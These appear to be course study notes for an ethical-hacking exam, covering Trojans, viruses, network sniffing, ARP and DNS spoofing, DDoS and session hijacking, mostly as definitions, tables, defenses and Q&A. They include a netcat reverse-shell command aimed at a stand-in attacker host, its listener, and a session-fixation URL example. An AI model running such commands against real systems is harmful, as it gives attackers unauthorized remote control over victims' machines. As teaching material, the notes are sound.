# Sessions 12–16: Trojans, Viruses, Sniffing, DoS & Session Hijacking

> **Exam Weight:** Very High | **Type:** Theory + Lab

---

# SESSION 12–13: Trojans, Backdoors & Malware

## 1. Trojan Horse

### 1.1 What is a Trojan?
A **Trojan** is malicious software that **disguises itself as legitimate software** to trick users into installing it. Unlike viruses, Trojans don't self-replicate.

Named after the Greek mythological Trojan Horse.

**Key Characteristic:** Trojans require USER ACTION to install (deception-based).

### 1.2 Types of Trojans

| Type | What it does | Example |
|------|-------------|---------|
| **Remote Access Trojan (RAT)** | Full remote control of victim | njRAT, DarkComet |
| **Backdoor Trojan** | Creates hidden access channel | NetBus, Back Orifice |
| **Password Stealer** | Captures login credentials | Keyloggers |
| **Keylogger** | Records keystrokes | Spyrix, Refog |
| **Banking Trojan** | Targets financial transactions | Zeus, TrickBot |
| **Downloader Trojan** | Downloads additional malware | |
| **Dropper** | "Drops" malware on system | |
| **FTP Trojan** | Opens FTP on victim | |
| **Proxy Trojan** | Turns victim into proxy | |
| **MBR Trojan** | Infects Master Boot Record | |

> **Tricky Q:** What is the difference between a Trojan and a backdoor?
> **A:** A Trojan is the delivery mechanism (disguised as legit software). A backdoor is the persistent access mechanism (can be delivered by Trojan, exploit, or legitimate software). A Trojan often installs a backdoor.

### 1.3 Overt vs Covert Channels

| | Overt Channel | Covert Channel |
|--|--------------|----------------|
| Definition | Intended, legitimate communication | Unintended, unauthorized communication path |
| Example | HTTP web browsing | DNS tunneling, ICMP tunneling |
| Detection | Easy | Difficult |
| Authorization | Yes | No |

> **Tricky Q:** What is a covert channel?
> **A:** A communication channel that uses a mechanism not designed for communication (e.g., encoding data in DNS queries, ICMP packets, timing) to exfiltrate data or communicate covertly.

### 1.4 Reverse-Connecting Trojans

```
Traditional (Bind) backdoor:
Attacker → connects to → Victim (victim listens on port)
Problem: Victim's firewall blocks inbound connections

Reverse-connecting Trojan:
Victim → connects back to → Attacker (attacker listens)
Solution: Victim initiates OUTBOUND connection → bypasses firewall!

C2 (Command and Control) communication:
Victim ← → Attacker's C2 server
```

> **Tricky Q:** Why are reverse-shell Trojans more effective than bind-shell Trojans?
> **A:** Firewalls typically block inbound connections but allow outbound. Reverse shells have victim initiate outbound connection to attacker, bypassing inbound firewall rules.

### 1.5 Netcat Trojan
- Netcat (`nc`) = "Swiss army knife" of networking
- Can create reverse shells: `nc -e /bin/sh attacker_ip 4444`
- Attacker listens: `nc -lvp 4444`
- Often used as simple backdoor

### 1.6 Indications of Trojan Infection

| Indicator | Description |
|-----------|-------------|
| **Unusual network activity** | Unexpected outbound connections |
| **Unknown processes** | Strange processes in Task Manager |
| **Changed registry entries** | HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run |
| **Disabled security software** | Antivirus turned off |
| **Unusual CPU/memory usage** | Unexpected resource consumption |
| **New user accounts** | Admin accounts created without knowledge |
| **Files modified/deleted** | Unexplained file changes |
| **Browser redirects** | Homepage changed, popups |

### 1.7 Trojan Countermeasures

- Keep OS and software updated
- Use reputable antivirus
- Don't open email attachments from unknown sources
- Don't download software from untrusted sources
- Use application whitelisting
- Monitor network traffic
- System integrity checkers (Tripwire, AIDE)

### 1.8 Trojan Evasion Techniques

| Technique | Method |
|-----------|--------|
| **Wrapping** | Embedding Trojan inside legitimate application |
| **Encryption** | Encrypt payload to avoid AV signature detection |
| **Packing** | Compress with custom packer |
| **Code Obfuscation** | Rewrite code to avoid patterns |
| **Polymorphism** | Changes signature with each infection |
| **Process Injection** | Inject into legitimate process memory |
| **Rootkit** | Hides presence at OS level |

### 1.9 Wrapping (Binding)
- Trojan is **bound with a legitimate program** (e.g., game.exe contains malware)
- When user runs game.exe, both game and Trojan install
- Tools: EliteWrap, Binder
- Detection: Hash verification, behavior analysis

### 1.10 System File Verification
```bash
# Windows System File Checker
sfc /scannow     # Scans and repairs protected system files

# Linux: aide (Advanced Intrusion Detection Environment)
aide --check     # Compare current state to known-good baseline

# Tripwire
tripwire --check # File integrity monitoring
```

---

# SESSION 14: Viruses & Worms

## 1. Virus vs Worm vs Trojan

| | Virus | Worm | Trojan |
|--|-------|------|--------|
| **Self-replicates?** | Yes (needs host file) | Yes (standalone) | No |
| **Needs user action?** | Usually | No | Yes |
| **Needs host file?** | Yes (attaches to files) | No | No |
| **Spreads via?** | Files, email, USB | Network, email (auto) | User deception |
| **Primary goal?** | Infect files | Spread, consume resources | Backdoor, steal |

> **Tricky Q:** What is the key difference between a virus and a worm?
> **A:** A virus requires a host file and typically needs user action to spread. A worm is self-contained and self-propagates through networks without user interaction.

## 2. Types of Viruses

| Type | How it Infects | Example |
|------|---------------|---------|
| **Boot Sector Virus** | Infects MBR/boot sector | Stoned, Michelangelo |
| **File Infector** | Attaches to .exe, .com files | Jerusalem |
| **Macro Virus** | Hides in Office macros | Melissa |
| **Network Virus** | Spreads via network shares | Nimda |
| **Polymorphic Virus** | Changes code each infection | Storm Worm |
| **Metamorphic Virus** | Rewrites itself completely | Zmist |
| **Stealth Virus** | Hides by intercepting system calls | Brain |
| **Multipartite** | Infects both boot sector and files | Ghostball |

> **Tricky Q:** What is the difference between polymorphic and metamorphic viruses?
> **A:** Polymorphic changes its encryption key/routine each infection (body stays same, but encrypted differently). Metamorphic rewrites its entire code each infection using mutation engines — no consistent signature at all.

## 3. Antivirus Detection Methods

| Method | How it Works | Limitations |
|--------|-------------|-------------|
| **Signature-based** | Compares to known malware signatures | Misses new/polymorphic malware |
| **Heuristic** | Analyzes behavior patterns/code structure | False positives |
| **Behavioral** | Monitors runtime behavior | Needs malware to execute |
| **Sandboxing** | Runs in isolated environment | Can detect sandboxes |
| **Machine Learning** | Trains on malware features | Adversarial samples |

## 4. Antivirus Evasion Techniques

- **Custom packers** — compress/encrypt to change signature
- **Obfuscation** — rewrite code without changing functionality
- **Process injection** — inject into legitimate process
- **Timing attacks** — delay execution until after sandbox analysis
- **Sandbox detection** — detect VM/sandbox, behave normally if detected
- **Living off the Land** — use built-in OS tools (PowerShell, WMI, certutil)
- **Fileless malware** — run in memory only, never touch disk

> **Tricky Q:** What is "fileless malware"?
> **A:** Malware that runs entirely in memory without writing files to disk. Uses legitimate OS tools (PowerShell, WMI) to execute malicious code. Evades file-based antivirus detection.

---

# SESSION 15: Sniffing, ARP Poisoning & DNS Spoofing

## 1. Network Sniffing

### 1.1 What is Sniffing?
Capturing network packets to **intercept and analyze network traffic**. Can capture passwords, emails, session tokens — anything sent in plaintext.

### 1.2 Passive vs Active Sniffing

| | Passive Sniffing | Active Sniffing |
|--|----------------|----------------|
| **Network type** | Hub-based (shared medium) | Switch-based (switched network) |
| **How** | Just listen (hub broadcasts all traffic) | Poison switch tables to redirect traffic |
| **Detection** | Very difficult | Some detection possible |
| **Techniques** | — | ARP Poisoning, MAC Flooding, DNS Spoofing |

> **Tricky Q:** Why doesn't passive sniffing work on switched networks?
> **A:** Switches maintain a MAC address table and forward frames only to the intended port. On a hub, all traffic is broadcast to all ports. Switched networks require active techniques to redirect traffic.

### 1.3 Protocols Susceptible to Sniffing

| Protocol | Port | What's exposed |
|----------|------|----------------|
| **HTTP** | 80 | Web traffic, credentials |
| **FTP** | 21 | Files, credentials (plaintext!) |
| **Telnet** | 23 | All commands, credentials |
| **SMTP** | 25 | Email content |
| **POP3** | 110 | Email credentials |
| **IMAP** | 143 | Email credentials |
| **SNMP v1/v2** | 161 | Community strings |

> **Tricky Q:** Which protocol sends usernames and passwords in complete plaintext?
> **A:** Telnet, FTP, HTTP Basic Auth, SMTP (without TLS), POP3 (without TLS)

### 1.4 MAC Flooding

```
Switches maintain CAM table: MAC Address → Port mapping

MAC Flooding:
1. Attacker sends thousands of frames with random fake MAC addresses
2. CAM table fills up (CAM table overflow)
3. Switch fails open → acts like a hub → broadcasts to all ports
4. Attacker can now sniff all traffic!

Tool: macof (part of dsniff)
Defense: Port security — limit MAC addresses per port, sticky MAC
```

> **Tricky Q:** What is CAM table overflow and what does it cause?
> **A:** Flooding a switch with fake MAC addresses fills its Content Addressable Memory (CAM) table. When full, switch broadcasts all frames to all ports (fails open like a hub), enabling sniffing.

### 1.5 ARP Poisoning (ARP Spoofing)

```
Normal ARP:
PC-A asks: "Who has IP 192.168.1.1?" (broadcast)
Router answers: "I do. My MAC is AA:BB:CC:DD:EE:FF" (unicast)
PC-A stores: 192.168.1.1 → AA:BB:CC:DD:EE:FF in ARP cache

ARP Poisoning Attack:
Attacker sends unsolicited (gratuitous) ARP reply to PC-A:
"192.168.1.1 is at [Attacker's MAC]"
→ PC-A updates ARP cache with wrong mapping
→ PC-A sends traffic intended for Router to Attacker!
→ MITM attack achieved!

Tools: arpspoof, Ettercap, Bettercap
```

> **Tricky Q:** What is a gratuitous ARP?
> **A:** An ARP reply sent without a corresponding ARP request. Used legitimately (IP conflict detection, cache update after failover) but abused in ARP poisoning attacks.

**ARP Poisoning Defense:**
- **Dynamic ARP Inspection (DAI)** — switch validates ARP packets against DHCP snooping table
- **Static ARP entries** — manually configure ARP cache (impractical at scale)
- **VLAN segmentation** — limit broadcast domains
- **ARP spoofing detection tools** — Arpwatch, XArp

### 1.6 DNS Spoofing Techniques

#### DNS Cache Poisoning
```
Normal DNS:
Client → DNS Query → DNS Server → Real Answer (e.g., google.com = 142.250.1.1)

DNS Cache Poisoning:
Attacker floods DNS server with fake responses
If fake response accepted before real one → wrong IP cached
All subsequent clients get malicious IP for that domain
→ Redirected to attacker's server (phishing, malware)
```

#### DNS Hijacking Methods
| Method | Description |
|--------|-------------|
| **Cache poisoning** | Corrupting DNS server's cache |
| **MITM** | Intercept DNS queries and respond with false data |
| **Rogue DNS server** | Configure victim to use attacker's DNS via DHCP |
| **DNS hijacking at router** | Modify router's DNS settings |

**Defense:** DNSSEC — digitally signs DNS records to prevent tampering

> **Tricky Q:** What is DNSSEC?
> **A:** DNS Security Extensions — uses digital signatures (public key cryptography) to authenticate DNS responses, preventing cache poisoning and spoofing.

### 1.7 Wireshark Capture/Display Filters (Review)

```
Key display filters:
arp                           # ARP traffic (detect poisoning)
arp.duplicate-address-detected # ARP conflicts
dns                           # DNS traffic
http.request.method == "POST" # Login attempts in HTTP
tcp.port == 21                # FTP traffic
ftp-data                      # FTP file transfers
smtp                          # Email traffic
```

---

# SESSION 16: DoS/DDoS, Session Hijacking

## 1. DoS/DDoS — Extended Coverage

### 1.1 How DDoS Works with Botnets

```
Attacker → Command & Control (C2) Server
                    ↓ (gives orders to)
         [Bot1] [Bot2] [Bot3]...[BotN]  (zombie machines)
                    ↓ (all attack simultaneously)
                 VICTIM SERVER
```

### 1.2 BOT/BOTNET Details
- **Bot** = compromised machine under attacker's control
- **Botnet** = network of bots (can be thousands to millions)
- **C2 (Command & Control)** = infrastructure attacker uses to communicate with bots
- **IRC-based C2** = old method (IRC channels)
- **HTTP-based C2** = bots poll a web URL for commands
- **P2P C2** = decentralized, harder to take down

**Famous Botnets:**
- **Mirai** (2016) — infected IoT devices, attacked Dyn DNS (took down Twitter, Netflix)
- **Zeus** — banking Trojan botnet
- **Conficker** — 9+ million machines

> **Tricky Q:** What made the Mirai botnet unique?
> **A:** It targeted IoT devices (cameras, routers, DVRs) using default/weak credentials, creating a massive botnet that launched record-breaking DDoS attacks.

### 1.3 DDoS Attack Types

#### Smurf Attack (Amplification)
```
1. Attacker spoofs victim's IP as source
2. Sends ICMP Echo to broadcast address
3. All hosts on network reply to victim's IP
4. Amplification = number of hosts (e.g., 500 hosts = 500× amplification)

Defense: Disable IP directed broadcast on routers
```

#### DNS Amplification
```
Attacker sends small DNS query (64 bytes) with spoofed victim IP
DNS server sends large response (3000+ bytes) to victim
Amplification factor: up to 50-100×
Uses ANY type DNS queries which return large responses
```

#### SYN Flood (revisited)
```
Half-open connections fill backlog queue
Server's listen() backlog default: 128 connections
Each SYN holds a slot for ~75 seconds until timeout
Legitimate connections rejected when backlog full

Defense: SYN Cookies, reduce SYN-ACK retries, increase backlog
```

---

## 2. Session Hijacking

### 2.1 What is Session Hijacking?
Taking over a **legitimate user's session** after they've authenticated. The attacker doesn't need the password — just the valid session token.

```
Normal:  User logs in → Server creates session → Session ID stored in cookie
         User sends requests with session ID → Server trusts it

Hijacking: Attacker steals session ID → Sends requests with stolen ID
           → Server thinks it's the legitimate user!
```

### 2.2 Types of Session Hijacking

| Type | Description |
|------|-------------|
| **Active hijacking** | Attacker takes over active session, disconnects legitimate user |
| **Passive hijacking** | Attacker only monitors session (silently intercepts) |
| **Network-level hijacking** | Intercept TCP sequence numbers |
| **Application-level hijacking** | Steal session cookies |

### 2.3 Steps to Perform Session Hijacking

```
1. SNIFF the network traffic
2. MONITOR session for session ID
3. PREDICT next session ID (if predictable)
4. DESYNCHRONIZE victim's connection (send RST to victim)
5. INJECT attacker's packets into the session
6. TAKEOVER session
```

### 2.4 Session Hijacking Techniques

#### Cookie Theft (Most Common)
- **XSS** — inject script to steal document.cookie
- **MITM** — sniff unencrypted cookies
- **Network sniffing** — capture session cookies over HTTP

#### Session Fixation
```
1. Attacker sets a known session ID before victim logs in
2. Victim logs in → server associates attacker's session ID with auth session
3. Attacker uses the known session ID → authenticated!

Example:
Attacker sends: http://bank.com/?PHPSESSID=known_value
Victim clicks, logs in → server uses known_value as their session ID
Attacker accesses: http://bank.com/ with PHPSESSID=known_value → logged in!

Defense: Regenerate session ID upon successful login (session ID rotation)
```

#### TCP Session Hijacking
```
TCP sequence numbers must match for packets to be accepted
Attacker must predict/observe sequence numbers
Injects packets with correct sequence number → server accepts
Victim's subsequent packets have wrong sequence number → desynchronized
```

### 2.5 Session Hijacking Prevention

| Control | How it helps |
|---------|-------------|
| **HTTPS everywhere** | Prevents sniffing of session cookies |
| **HttpOnly cookie flag** | Prevents XSS cookie theft |
| **Secure cookie flag** | Cookie only sent over HTTPS |
| **SameSite cookie** | Prevents CSRF (Strict/Lax) |
| **Session ID rotation** | New ID after login/privilege change |
| **Short session timeout** | Reduces window for hijacking |
| **IP binding** | Tie session to IP (problematic with mobile) |
| **Token binding** | Cryptographically bind tokens to TLS session |

### 2.6 Spoofing vs Hijacking

| | IP Spoofing | Session Hijacking |
|--|-------------|-------------------|
| What's faked | IP address | Session token/cookie |
| Requires interception? | No (just forge packet) | Usually yes |
| Works with TCP? | Limited (no full connection) | Yes (steals existing session) |
| Layer | Network (L3) | Application (L7) |

---

## 3. Exam Questions Bank

**Q1:** What is the key difference between active and passive sniffing?
**A:** Passive sniffing just captures traffic on a hub. Active sniffing injects packets (ARP poisoning, MAC flooding) to force a switch to send traffic to the attacker.

**Q2:** What is ARP and why is it vulnerable?
**A:** Address Resolution Protocol maps IP addresses to MAC addresses. It's vulnerable because it's stateless and accepts unsolicited replies — any machine can send fake ARP responses.

**Q3:** What is session fixation vs session hijacking?
**A:** Session fixation = attacker sets the session ID before auth; hijacking = attacker steals an already-established session ID after auth.

**Q4:** What is a polymorphic virus?
**A:** Changes its signature/encryption with each infection while maintaining the same malicious payload. Evades signature-based antivirus detection.

**Q5:** What does MAC flooding cause?
**A:** Switch's CAM table fills up; switch fails open and broadcasts all traffic to all ports (like a hub), enabling sniffing.

**Q6:** What cookie flags prevent session hijacking?
**A:** `HttpOnly` (prevents XSS theft), `Secure` (HTTPS only), `SameSite=Strict` (prevents CSRF)

**Q7:** What is fileless malware and why is it hard to detect?
**A:** Malware running only in memory using legitimate OS tools. No files written to disk → file-based AV can't detect it.

**Q8:** What is DNS cache poisoning?
**A:** Inserting false DNS records into a resolver's cache, causing clients to resolve domain names to malicious IP addresses.

---

*Next: Sessions 17–20 → Web Server Hacking, Wireless, Penetration Testing, Malware Analysis*
